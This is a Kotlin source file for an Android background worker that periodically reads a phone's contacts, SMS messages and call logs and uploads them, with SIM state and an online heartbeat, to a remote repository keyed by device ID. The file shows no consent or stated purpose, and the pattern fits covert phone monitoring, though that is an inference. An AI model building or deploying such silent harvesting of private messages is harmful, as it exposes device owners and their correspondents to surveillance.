package com.boxx.datasync.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        val isIncremental = tags.contains("IncrementalSync")
        val lastSmsSync = if (isIncremental) prefs.getLong("last_sms_sync", 0L) else 0L
        val lastCallSync = if (isIncremental) prefs.getLong("last_call_sync", 0L) else 0L
        val lastContactSync = if (isIncremental) prefs.getLong("last_contact_sync", 0L) else 0L

        android.util.Log.d("Sync", "BACKGROUND_SYNC_STARTED incremental: $isIncremental")

        return try {
            val contacts = DataHelper.fetchContacts(applicationContext, sinceTimestamp = lastContactSync)
            val smsList = DataHelper.fetchSMS(applicationContext, sinceTimestamp = lastSmsSync)
            val callLogs = DataHelper.fetchCallLogs(applicationContext, sinceTimestamp = lastCallSync)

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)
            repository.syncCallLogs(deviceId, callLogs)

            val simState = DataHelper.getSimState(applicationContext)
            android.util.Log.d("Sync", "SIM_STATE_LOADED")
            if (simState["sim1Ready"] as Boolean) android.util.Log.d("Sync", "SIM1_AVAILABLE")
            if (simState["sim2Ready"] as Boolean) android.util.Log.d("Sync", "SIM2_AVAILABLE")
            if (!(simState["sim1Ready"] as Boolean) && !(simState["sim2Ready"] as Boolean)) android.util.Log.d("Sync", "NO_SIM_AVAILABLE")

            val updateMap = mutableMapOf<String, Any>(
                "deviceId" to deviceId,
                "deviceName" to Build.MODEL,
                "lastSyncTime" to System.currentTimeMillis(),
                "heartbeatAt" to System.currentTimeMillis(),
                "contactCount" to contacts.size,
                "smsCount" to smsList.size,
                "callCount" to callLogs.size,
                "notificationCount" to 0,
                "timestamp" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "presenceStatus" to "Online",
                "lastError" to ""
            )
            updateMap.putAll(simState)

            repository.updateDeviceInfoMap(deviceId, updateMap)
            android.util.Log.d("Sync", "AUTO_SYNC_SUCCESS")
            Result.success()
        } catch (e: Exception) {
            android.util.Log.d("Sync", "AUTO_SYNC_FAILED")
            Result.retry()
        }
    }
}
